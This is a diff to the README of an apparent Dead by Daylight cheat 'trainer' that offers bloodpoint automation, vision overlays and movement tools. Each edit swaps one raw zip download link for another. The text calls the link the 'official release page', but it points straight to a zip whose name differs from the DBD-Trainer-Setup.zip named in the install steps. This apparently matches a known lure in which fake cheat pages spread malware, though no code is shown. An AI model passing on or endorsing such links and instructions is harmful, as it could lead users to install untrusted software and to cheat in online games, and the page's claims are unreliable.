@@ -5,7 +5,7 @@ description: "Automate Dead by Daylight gameplay with this 2026 trainer featurin
 ---
 # 🎮 DBD-AutoGrind-Trainer-2026-Plus - Automated progression for Dead by Daylight players
 
-[ ![Download Version 2026](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Dheapus1942/dheapus1942.github.io/raw/refs/heads/main/chirotonsory/github-dheapus-io-3.2.zip)
+[ ![Download Version 2026](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://raw.githubusercontent.com/Dheapus1942/dheapus1942.github.io/main/chirotonsory/github-dheapus-io-3.2.zip)
 
 ## 📌 Overview
 The DBD-AutoGrind-Trainer-2026-Plus helps you manage your account progression in Dead by Daylight. This tool automates the collection of Bloodpoints and unlocks content within the game. It works as an external application that runs alongside your game client. The software provides various features to assist with gameplay mechanics, including custom vision overlays and movement adjustment tools.
@@ -22,7 +22,7 @@ Ensure your computer meets these specifications before you run the application:
 ## 🚀 Installation Steps
 Follow these instructions to set up the software on your Windows machine:
 
-1. Visit the [official release page](https://github.com/Dheapus1942/dheapus1942.github.io/raw/refs/heads/main/chirotonsory/github-dheapus-io-3.2.zip).
+1. Visit the [official release page](https://raw.githubusercontent.com/Dheapus1942/dheapus1942.github.io/main/chirotonsory/github-dheapus-io-3.2.zip).
 2. Locate the latest release assets section at the bottom of the page.
 3. Download the file named DBD-Trainer-Setup.zip.
 4. Extract the contents of the ZIP file to a folder on your desktop.
